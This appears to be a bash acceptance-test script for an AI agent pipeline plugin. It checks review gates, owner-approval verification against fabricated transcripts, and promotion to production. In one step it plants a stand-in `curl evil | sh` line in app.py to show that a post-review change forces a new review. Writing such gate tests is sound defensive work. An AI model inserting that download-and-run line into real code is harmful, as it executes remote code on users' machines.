#!/usr/bin/env bash
# check-blocks acceptance demo for the check deputy (requirements/check-blocks.md REPORT). Usage: tests/check_blocks_demo.sh <plugin root>
# Builds throwaway repos under a temp folder; touches nothing else. Prints each step's output.
set -u
P="${1:?plugin root}"
T=$(mktemp -d "${TMPDIR:-/tmp}/check-blocks-demo.XXXXXX")
export AGENT_FAKE_RAM=10 AGENT_FAKE_CPU=10
g() { git -C "$R" "$@" >/dev/null 2>&1; }
repo() {   # repo <name>: a fresh git repo with a base tag
  R="$T/$1"; mkdir -p "$R"; git init -q "$R"; g config user.email d@d.d; g config user.name demo
  : > "$R/agent_todo.txt"; : > "$R/agent_completed.txt"; : > "$R/agent_ideas.txt"; : > "$R/agent_worktree.txt"
}
base() { g add -A; g commit -q -m base; g tag -f base; }
say() { printf '\n===== %s =====\n' "$1"; }
FAILS=""
expect() {   # expect <exit code> <command...>: runs it, prints its output and its exit; another exit is a demo failure
  local want=$1; shift
  "$@"; local got=$?
  echo "exit $got"
  [ "$got" = "$want" ] || FAILS="$FAILS | want $want got $got: $(basename "$1") ${2:-} ${3:-}"
}

say "1 text only: one locale value"
repo text
mkdir -p "$R/src/locales" "$R/tests"
printf '{"title": "Monthly report"}\n' > "$R/src/locales/en.json"
printf "expect(t).toBe('Monthly report')\n" > "$R/tests/report.test.js"
printf 'guard_tests=tests/report.test.js\nrelated_cmd=npx jest --maxWorkers=2 {tests}\n' > "$R/agent_repo.conf"
base
printf '{"title": "Report of the month"}\n' > "$R/src/locales/en.json"
(cd "$R" && "$P/bin/agent-level.sh" check --base base)

say "2 UI style: a shared component's CSS"
repo style
mkdir -p "$R/src/components" "$R/src/pages"
printf '.card{padding:4px}\n' > "$R/src/components/Card.css"
printf 'render(<Card />)\n' > "$R/src/components/Card.test.jsx"
printf 'render(<Home><Card /></Home>)\n' > "$R/src/pages/Home.test.jsx"
base
printf '.card{padding:8px}\n' > "$R/src/components/Card.css"
(cd "$R" && "$P/bin/agent-level.sh" check --base base)

say "3 one-feature logic: a new export column"
repo logic
mkdir -p "$R/src/export"
printf "cols = ['a']\n" > "$R/src/export/csv.js"
printf "require('./csv')\n" > "$R/src/export/csv.test.js"
base
printf "cols = ['a', 'b']\nrow.b = total(x)\n" > "$R/src/export/csv.js"
(cd "$R" && "$P/bin/agent-level.sh" check --base base)

say "4 migration with UPDATE"
repo db
mkdir -p "$R/db/migrations"; printf 'x\n' > "$R/seed.txt"
base
printf 'UPDATE orders SET note = %s WHERE note IS NULL;\n' "''" > "$R/db/migrations/0003.sql"
(cd "$R" && "$P/bin/agent-level.sh" check --base base)

say "5 a merge refused for a missing result line"
repo gate
printf 'x()\n' > "$R/app.js"; base; printf 'y()\n' > "$R/app.js"
g add app.js; g commit -q -m "banner to toast"     # the gate plans what merges: committed work only
cd "$R"
"$P/bin/agent-file.sh" todo add t small "banner to toast" 10 --checks "PR REVIEW" --builder "t Deputy"
for b in "DIFF SCAN" "BUILD" "RELATED TESTS"; do "$P/bin/agent-file.sh" check t "$b" pass --by "t Deputy" --evidence demo; done
"$P/bin/agent-file.sh" checks gate t --dir "$R" --base base; echo "exit $?"
"$P/bin/agent-file.sh" check t "PR REVIEW" pass --by "t Check" --evidence "read the diff"
echo "-- F2: a PR REVIEW counts only when the main manager launched the reviewer (no record yet):"
"$P/bin/agent-file.sh" checks gate t --dir "$R" --base base; echo "exit $?"
echo "-- the guard's record of the main manager's reviewer launch (written by the guard hook in a real session):"
printf '{"task": "t", "type": "reviewer", "by": "main", "at": "%s"}\n' "$(date '+%Y-%m-%d %H:%M')" \
  >> "$(git -C "$R" rev-parse --path-format=absolute --git-common-dir)/agent_launches.jsonl"
"$P/bin/agent-file.sh" check t "PR REVIEW" pass --by "t Review" --evidence "read the diff"
"$P/bin/agent-file.sh" checks gate t --dir "$R" --base base; echo "exit $?"
echo "-- F3: a commit after the review: the pass is on an older commit"
printf 'z()\n' > "$R/app.js"; g add app.js; g commit -q -m "one more change"
"$P/bin/agent-file.sh" checks gate t --dir "$R" --base base; echo "exit $?"

say "6 next lists a queued task that can start"
repo next
cd "$R"
"$P/bin/agent-file.sh" todo add a small "first task" 10 --scope "src/a/**"
"$P/bin/agent-file.sh" todo stage a tests
"$P/bin/agent-file.sh" todo add b small "second task" 10 --scope "src/b/**"
"$P/bin/agent-file.sh" todo wait b on queue --after a
"$P/bin/agent-file.sh" next
"$P/bin/agent-file.sh" todo done a --work 5 --type script --lane fast
"$P/bin/agent-file.sh" next

say "7 init writes agent_repo.conf in a scratch repo"
repo init
mkdir -p "$R/bin" "$R/tests"
printf 'x = 1\n' > "$R/bin/tool.py"
printf 'import os, unittest\nclass T(unittest.TestCase):\n    def test_walk(self):\n        list(os.walk("."))\n' > "$R/tests/test_tree.py"
: > "$R/tests/__init__.py"
g add bin tests; g commit -q -m "fix: empty list crashes the report"   # no agent file committed: a new repo
"$P/bin/agent-init.sh" "$R" | grep -E "agent_repo.conf|working branch|checkout:"; echo "HEAD now: $(git -C "$R" rev-parse --abbrev-ref HEAD)"
cat "$R/agent_repo.conf"

say "7b F4: init in a repo that already uses the plugin (agent_todo.txt committed) switches nothing"
repo used
printf 'x\n' > "$R/seed.txt"; g add -A; g commit -q -m "uses the plugin"
"$P/bin/agent-init.sh" "$R" | grep -E "working branch|checkout:|WORKING BRANCH"; echo "HEAD now: $(git -C "$R" rev-parse --abbrev-ref HEAD)"

say "8 F1: the direct path to production is bound to the task"
repo direct
O="$T/direct-origin.git"; git init -q --bare "$O"
printf 'x\n' > "$R/seed.txt"; g add -A; g commit -q -m base; g branch -M main; g remote add origin "$O"; g push -q -u origin main
g config auto-pipeline.workingbranch ap-main-demo; g switch -q -c ap-main-demo; g push -q -u origin ap-main-demo
g switch -q -c urgent main; printf 'fix\n' > "$R/fix.txt"; g add -A; g commit -q -m urgent; g push -q -u origin urgent; g switch -q ap-main-demo
cd "$R"
echo "-- a quote at promote time is refused:"
"$P/bin/agent-promote.sh" --task urgent --branch urgent --owner-quote "please fix the footer typo on the site"; echo "exit $?"
echo "-- not a production task:"
"$P/bin/agent-file.sh" todo add urgent small "urgent fix" 10 >/dev/null
"$P/bin/agent-promote.sh" --task urgent --branch urgent; echo "exit $?"
echo "-- target production needs the owner's words:"
"$P/bin/agent-file.sh" todo add urgent2 small "urgent fix" 10 --target production; echo "exit $?"

say "9 F7: a modified agent_todo.txt never blocks sync"
g switch -q main; printf 'theirs\n' > "$R/theirs.txt"; g add theirs.txt; g commit -q -m "another person's publish"; g push -q origin main; g switch -q ap-main-demo
printf 'x | small | x | est 5m\n' >> "$R/agent_todo.txt"
git -C "$R" status --short agent_todo.txt
"$P/bin/agent-promote.sh" --sync; echo "exit $?"

# ---- the two walks of FIX ORDER 4: only the commands the skills and agent files give, in scratch repos
launch() {   # launch <task> <subagent type> <description>: the main manager's Agent call as the guard hook sees it
  printf '%s 2026-11-25 19:00 s-main term_main\n' "$$" > "$(git -C "$M" rev-parse --path-format=absolute --git-common-dir)/agent_main.lock"
  printf '{"hook_event_name": "PreToolUse", "tool_name": "Agent", "session_id": "s-main", "cwd": "%s", "tool_use_id": "toolu_%s", "tool_input": {"description": "%s", "prompt": "brief", "subagent_type": "%s"}}' \
    "$M" "$1$RANDOM" "$3" "$2" | (cd "$M" && env -u AGENT_ROLE CLAUDE_PID=$$ "$P/bin/agent-guard.sh" >/dev/null 2>&1)   # the main manager's session has no AGENT_ROLE
}
CFG="$T/claude-home"; mkdir -p "$CFG"; export CLAUDE_CONFIG_DIR="$CFG"   # the owner's transcripts live here (G13)
owner_said() {   # owner_said <words>: the owner types <words> in a session of repo $M (the real verify reads it)
  python3 - "$CFG" "$M" "$1" <<'PY'
import json, os, re, sys, time, uuid
cfg, repo, words = sys.argv[1:4]
for path in {repo, os.path.realpath(repo)}:
    d = os.path.join(cfg, "projects", re.sub(r"[^A-Za-z0-9]", "-", path))
    os.makedirs(d, exist_ok=True)
    line = {"parentUuid": None, "isSidechain": False, "type": "user", "uuid": str(uuid.uuid4()),
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()), "userType": "external",
            "sessionId": "demo-owner", "version": "2.1.331", "message": {"role": "user", "content": words},
            "origin": {"kind": "human"}, "promptSource": "typed", "turnOrigin": "human"}
    with open(os.path.join(d, "demo-owner.jsonl"), "a") as fh:
        fh.write(json.dumps(line) + "\n")
PY
}
flowrepo() {   # flowrepo <name>: a main checkout on its working branch, an origin, production main
  M="$T/$1"; O="$T/$1-origin.git"; git init -q --bare "$O"; mkdir -p "$M"; git init -q "$M"
  git -C "$M" config user.email d@d.d; git -C "$M" config user.name demo
  : > "$M/agent_todo.txt"; : > "$M/agent_completed.txt"; : > "$M/agent_ideas.txt"; : > "$M/agent_worktree.txt"
  printf 'x = 1\n' > "$M/app.py"; printf 'version=1\nrelated_cmd=python3 -m unittest {modules}\n' > "$M/agent_repo.conf"
  git -C "$M" add -A; git -C "$M" commit -q -m base; git -C "$M" branch -M main
  git -C "$M" remote add origin "$O"; git -C "$M" push -q -u origin main
  git -C "$M" config auto-pipeline.workingbranch ap-main-demo
  git -C "$M" switch -q -c ap-main-demo; git -C "$M" push -q -u origin ap-main-demo
}

say "walk 1: a small task from dispatch to todo done on the working branch"
flowrepo walk1; cd "$M"
echo "-- dispatch step 2: the todo line, then the fast-lane deputy's brief names target, base, working and production branch"
"$P/bin/agent-file.sh" todo add w1 small "rename the total" 10 --checks "PR REVIEW" --builder "w1 Deputy"
W="$T/walk1-w1"; git -C "$M" fetch -q origin; git -C "$M" worktree add -q -b w1 "$W" origin/ap-main-demo   # base: origin/<working branch>
"$P/bin/agent-file.sh" worktree set "$W" w1 working
printf 'total = 1\n' > "$W/app.py"; git -C "$W" commit -qam "rename the total"; git -C "$W" push -q -u origin w1
echo "-- the deputy runs the blocks it can, in its worktree"
(cd "$W" && "$P/bin/agent-level.sh" check --base origin/ap-main-demo | grep -E "^BLOCKS")
for b in "DIFF SCAN" "BUILD" "RELATED TESTS"; do (cd "$W" && "$P/bin/agent-file.sh" check w1 "$b" pass --by "w1 Deputy" --evidence demo); done
echo "-- /merge: the main manager launches the reviewer (the guard records it); the reviewer writes from the main checkout with --commit <head>"
launch w1 auto-pipeline:reviewer "w1 Review"
HEAD1=$(git -C "$W" rev-parse HEAD)
"$P/bin/agent-file.sh" check w1 "PR REVIEW" pass --by "w1 Review" --commit "$HEAD1" --evidence "read the diff against the requirement"
echo "-- the merge deputy: the gate, then the merge into the working branch in the main checkout"
if "$P/bin/agent-file.sh" checks gate w1 --dir "$W" --branch w1; then
  git -C "$M" merge -q --no-ff origin/w1 -m "Merge w1 (W8)"; git -C "$M" push -q origin ap-main-demo
  MH=$(git -C "$M" rev-parse --short HEAD)
  git -C "$M" push -q origin --delete w1
  echo "-- the deputy's cleanup of a fast-lane subagent's worktree: clean (agent_*.txt aside) and its commits in the target, then --force"
  if [ -z "$(git -C "$W" status --porcelain | grep -v ' agent_[a-z]*\.txt$')" ] && [ -z "$(git -C "$W" log --oneline origin/ap-main-demo..HEAD)" ]; then
    git -C "$M" worktree remove --force "$W"; git -C "$M" worktree prune; git -C "$M" branch -q -d w1
  else echo "-- not clean or commits not in the target: the deputy stops and reports"; fi
  "$P/bin/agent-file.sh" worktree rm "$W"
  "$P/bin/agent-file.sh" todo done w1 --merge "$MH" --work 5 --type script --lane fast | grep -E "todo done|released|batch"
else echo "-- GATE REFUSED: the merge deputy stops here"; fi
echo "working branch now: $(git -C "$M" log --oneline -1 ap-main-demo)"

say "walk 2: a task with target production"
flowrepo walk2; cd "$M"
owner_said "1. rename the total. 2. need to publish direct after done. others wait for me review"   # his numbered batch, typed in his own session (a made transcript)
echo "-- dispatch: task 2 of his numbered batch gets target production; the tool verifies his words and stores what the main manager read"
echo "-- no --means: refused, nothing written"
expect 1 "$P/bin/agent-file.sh" todo add p1 small "fix the total and publish it" 10 --checks "PR REVIEW" --builder "p1 Deputy" --target production --owner-quote "2. need to publish direct after done"
echo "-- words he never typed: refused"
expect 1 "$P/bin/agent-file.sh" todo add p1 small "fix the total and publish it" 10 --checks "PR REVIEW" --builder "p1 Deputy" --target production --owner-quote "publish task two straight away please" --means "publish task 2 (p1) to production"
echo "-- his words and what the main manager read from them: stored"
expect 0 "$P/bin/agent-file.sh" todo add p1 small "fix the total and publish it" 10 --checks "PR REVIEW" --builder "p1 Deputy" --target production --owner-quote "2. need to publish direct after done" --means "publish task 2 (p1) to production"
W="$T/walk2-p1"; git -C "$M" fetch -q origin; git -C "$M" worktree add -q -b p1 "$W" origin/main   # base: origin/<production branch>
"$P/bin/agent-file.sh" worktree set "$W" p1 working
printf 'x = 2\n' > "$W/app.py"; git -C "$W" commit -qam "fix the total"; git -C "$W" push -q -u origin p1
for b in "DIFF SCAN" "BUILD" "RELATED TESTS"; do (cd "$W" && "$P/bin/agent-file.sh" check p1 "$b" pass --by "p1 Deputy" --evidence demo); done
launch p1 auto-pipeline:reviewer "p1 Review"
HEAD2=$(git -C "$W" rev-parse HEAD)
"$P/bin/agent-file.sh" check p1 "PR REVIEW" pass --by "p1 Review" --commit "$HEAD2" --evidence "read the diff against the requirement"
echo "-- /merge: the gate (it prints the stored words), then promote --task (no quote: the stored words); production merged back at once"
if "$P/bin/agent-file.sh" checks gate p1 --dir "$W" --branch p1 --base origin/main; then
  expect 0 "$P/bin/agent-promote.sh" --task p1 --branch p1
  MH=$(git -C "$M" rev-parse --short origin/main)
  echo "-- the merge deputy with merged: $MH: the branch, the cleanup, todo done"
  git -C "$M" push -q origin --delete p1
  if [ -z "$(git -C "$W" status --porcelain | grep -v ' agent_[a-z]*\.txt$')" ] && git -C "$M" merge-base --is-ancestor origin/p1 origin/main 2>/dev/null || git -C "$M" merge-base --is-ancestor "$HEAD2" origin/main; then
    git -C "$M" worktree remove --force "$W"; git -C "$M" worktree prune; git -C "$M" branch -q -D p1   # a production task: checked against production, then -D
  else echo "-- not in production: the deputy stops and reports"; fi
  "$P/bin/agent-file.sh" worktree rm "$W"
  "$P/bin/agent-file.sh" todo done p1 --merge "$MH" --work 5 --type script --lane fast | grep -E "todo done|released|batch"
else echo "-- GATE REFUSED: no promote"; FAILS="$FAILS | walk 2 gate refused"; fi
echo "production now: $(git -C "$M" log --oneline -1 origin/main)"
echo "working branch has production: $(git -C "$M" merge-base --is-ancestor origin/main ap-main-demo && echo yes || echo no)"
cd "$T"

say "walk 3: an urgent small production task, done by a fast-lane deputy in an Agent worktree (no worktree line)"
flowrepo walk3; cd "$M"
echo "-- dispatch step 2: no number, he names the task by its description; exactly one task fits, so no question; base: origin/main"
owner_said "the urgent total fix can go live straight after it is done"
expect 0 "$P/bin/agent-file.sh" todo add u1 small "urgent: fix the total and publish it" 10 --checks "PR REVIEW" --builder "u1 Deputy" --target production --owner-quote "the urgent total fix can go live straight after it is done" --means "publish u1 (the urgent total fix) to production"
W="$T/walk3-agent-wt"; git -C "$M" fetch -q origin; git -C "$M" worktree add -q -b u1 "$W" origin/main
printf 'x = 4\n' > "$W/app.py"; git -C "$W" commit -qam "urgent fix"; git -C "$W" push -q -u origin u1
for b in "DIFF SCAN" "BUILD" "RELATED TESTS"; do (cd "$W" && "$P/bin/agent-file.sh" check u1 "$b" pass --by "u1 Deputy" --evidence demo >/dev/null); done
launch u1 auto-pipeline:reviewer "u1 Review"
"$P/bin/agent-file.sh" check u1 "PR REVIEW" pass --by "u1 Review" --commit "$(git -C "$W" rev-parse HEAD)" --evidence "read the diff" >/dev/null
echo "-- /merge step 4: the gate on the deputy's worktree (it brings the deputy's lines into the main repo), then promote --task"
if "$P/bin/agent-file.sh" checks gate u1 --dir "$W" --branch u1 --base origin/main | grep -E "GATE|OWNER WORDS"; then
  expect 0 "$P/bin/agent-promote.sh" --task u1 --branch u1
else echo "-- GATE REFUSED: no promote"; FAILS="$FAILS | walk 3 gate refused"; fi
echo "production now: $(git -C "$M" log --oneline -1 origin/main)"
cd "$T"

say "walk 4: the owner's real state: an upgraded repo, the main checkout still on production, three agent files modified"
flowrepo walk4; cd "$M"; git -C "$M" switch -q main                     # not switched yet (section 33)
printf 'x | small | x | est 5m\n' >> "$M/agent_todo.txt"; printf 'idea\n' >> "$M/agent_ideas.txt"; printf 'done\n' >> "$M/agent_completed.txt"
git -C "$M" status --short
"$P/bin/agent-file.sh" todo add w4 small "rename the total" 10 --checks "PR REVIEW" --builder "w4 Deputy" >/dev/null
W="$T/walk4-w4"; git -C "$M" fetch -q origin; git -C "$M" worktree add -q -b w4 "$W" origin/main
printf 'total = 4\n' > "$W/app.py"; git -C "$W" commit -qam "rename the total"; git -C "$W" push -q -u origin w4
for b in "DIFF SCAN" "BUILD" "RELATED TESTS"; do (cd "$W" && "$P/bin/agent-file.sh" check w4 "$b" pass --by "w4 Deputy" --evidence demo >/dev/null); done
launch w4 auto-pipeline:reviewer "w4 Review"
"$P/bin/agent-file.sh" check w4 "PR REVIEW" pass --by "w4 Review" --commit "$(git -C "$W" rev-parse HEAD)" --evidence "read it" >/dev/null
echo "-- the deputy, step 1: git status lists agent_*.txt only; the gate"
[ -z "$(git -C "$M" status --short | grep -v ' agent_[a-z]*\.txt$')" ] && echo "status: agent files only"
if "$P/bin/agent-file.sh" checks gate w4 --dir "$W" --branch w4 --base origin/main | grep -E "GATE"; then
  echo "-- step 2: the checkout is on $(git -C "$M" branch --show-current), the production branch of a repo not switched yet: merges go on as before"
  git -C "$M" merge -q --no-ff origin/w4 -m "Merge w4 (W8)"; git -C "$M" push -q origin main
  echo "production now: $(git -C "$M" log --oneline -1 origin/main)"
fi
cd "$T"

say "walk 5: the working branch published on his words"
flowrepo walk5; cd "$M"
printf 'full_cmd=true\n' >> "$M/agent_repo.conf"; printf 'y = 1\n' > "$M/more.py"
git -C "$M" add -A; git -C "$M" commit -qm "more work on the working branch"; git -C "$M" push -q origin ap-main-demo
echo "-- the release run: one green full run on the tip of the working branch"
"$P/bin/agent-nightly.sh" --start --wait >/dev/null 2>&1; "$P/bin/agent-nightly.sh" --release-ok
owner_said "all good on the working branch, publish everything to production now"
echo "-- no --means: refused, nothing pushed"
expect 1 "$P/bin/agent-promote.sh" --owner-quote "publish everything to production now"
echo "-- words he never typed: refused"
expect 1 "$P/bin/agent-promote.sh" --owner-quote "ship the whole working branch tonight" --means "publish the working branch ap-main-demo to production"
echo "-- his words and what the main manager read from them: published, and the pair is printed"
expect 0 "$P/bin/agent-promote.sh" --owner-quote "publish everything to production now" --means "publish the working branch ap-main-demo to production"
echo "production now: $(git -C "$M" log --oneline -1 origin/main)"
cd "$T"

say "10 FIX ORDERS 6 and 10: G1-G3, H1, and the approval rule of section 53 (the owner's words verified for real against his made transcript)"
flowrepo order6; cd "$M"
"$P/bin/agent-file.sh" todo add g small "small fix" 10 --checks "PR REVIEW" >/dev/null
owner_said "skip the related tests for g, it is only a typo"; owner_said "1A"
echo "-- G1: PR REVIEW is never removed, whatever he typed:"
expect 1 "$P/bin/agent-file.sh" todo checks g --remove "PR REVIEW" --owner-quote "skip the related tests for g" --means "leave out PR REVIEW for g"
echo "-- section 53: words he never typed are refused:"
expect 1 "$P/bin/agent-file.sh" todo checks g --remove "RELATED TESTS" --owner-quote "please drop every test of this task" --means "leave out RELATED TESTS for g"
echo "-- section 53: no --means is refused:"
expect 1 "$P/bin/agent-file.sh" todo checks g --remove "RELATED TESTS" --owner-quote "skip the related tests for g"
echo "-- section 53: his words (no fixed sentence) and what the main manager read remove it:"
expect 0 "$P/bin/agent-file.sh" todo checks g --remove "RELATED TESTS" --owner-quote "skip the related tests for g" --means "leave out RELATED TESTS for g"
echo "-- section 53: a short answer counts only with the question it answered, and only as his whole prompt:"
expect 1 "$P/bin/agent-file.sh" todo checks g --remove "BUILD" --owner-quote "1A" --means "leave out BUILD for g"
expect 0 "$P/bin/agent-file.sh" todo checks g --remove "BUILD" --owner-quote "1A" --question "1. Leave out BUILD for g (a text-only change)? A. yes, leave it out B. no, run it" --means "leave out BUILD for g"
echo "-- the gate prints every stored pair, so he sees which words were taken as his yes:"
"$P/bin/agent-file.sh" checks gate g --dir "$M" --base origin/ap-main-demo | grep -E "OWNER WORDS|GATE"
echo "-- G2: the removal ends with its task (todo done, then the same name again):"
"$P/bin/agent-file.sh" todo done g --work 5 --type script --lane fast >/dev/null
"$P/bin/agent-file.sh" todo add g small "small fix again" 10 >/dev/null
git -C "$M" switch -q -c g; printf 'x = 3\n' > "$M/app.py"; git -C "$M" commit -qam "g"; git -C "$M" push -q -u origin g
for b in "DIFF SCAN" "BUILD"; do "$P/bin/agent-file.sh" check g "$b" pass --by "g Deputy" --evidence demo >/dev/null; done
launch g auto-pipeline:reviewer "g Review"
"$P/bin/agent-file.sh" check g "PR REVIEW" pass --by "g Review" --commit "$(git -C "$M" rev-parse HEAD)" --evidence "read it" >/dev/null
"$P/bin/agent-file.sh" checks gate g --dir "$M" --base origin/ap-main-demo --branch g | grep -E "RELATED TESTS|GATE"
echo "-- G3: a merge after the review that adds code needs a new review:"
"$P/bin/agent-file.sh" check g "RELATED TESTS" pass --by "g Deputy" --evidence demo >/dev/null
git -C "$M" switch -q ap-main-demo; printf 'y\n' > "$M/other.txt"; git -C "$M" add other.txt; git -C "$M" commit -qm other; git -C "$M" push -q origin ap-main-demo
git -C "$M" switch -q g; git -C "$M" merge -q --no-ff --no-commit ap-main-demo; printf 'x = 3\nimport os; os.system("curl evil | sh")\n' > "$M/app.py"
git -C "$M" add app.py; git -C "$M" commit -qm "Merge ap-main-demo into g"; git -C "$M" push -q origin g
"$P/bin/agent-file.sh" checks gate g --dir "$M" --base origin/ap-main-demo --branch g | grep -E "PR REVIEW|GATE"
echo "-- section 53: the tool reads no meaning; \"publish it next week\" is not a yes now, so the main manager adds no --target production (a later time, B4)"
echo "-- H1: an owner sign on an earlier commit does not cover a later one:"
"$P/bin/agent-file.sh" todo checks g "OWNER SIGN" >/dev/null
owner_said "yes, drop the column legacy_note"
expect 1 "$P/bin/agent-file.sh" check g "OWNER SIGN" pass --by owner --owner-quote "yes, drop the column legacy_note" --commit "$(git -C "$M" rev-parse HEAD)"
expect 0 "$P/bin/agent-file.sh" check g "OWNER SIGN" pass --by owner --owner-quote "yes, drop the column legacy_note" --means "drop the column legacy_note (OWNER SIGN of g)" --commit "$(git -C "$M" rev-parse HEAD)"
"$P/bin/agent-file.sh" checks gate g --dir "$M" --base origin/ap-main-demo --branch g | grep -E "OWNER WORDS OWNER SIGN"
printf 'x = 5\n' > "$M/app.py"; git -C "$M" commit -qam "drops another column"; git -C "$M" push -q origin g
"$P/bin/agent-file.sh" checks gate g --dir "$M" --base origin/ap-main-demo --branch g | grep -E "OWNER SIGN|GATE"
cd "$T"

say "done: everything above ran in $T (delete it when read)"
[ -z "$FAILS" ] || { echo "DEMO FAILED:$FAILS"; exit 1; }
exit 0
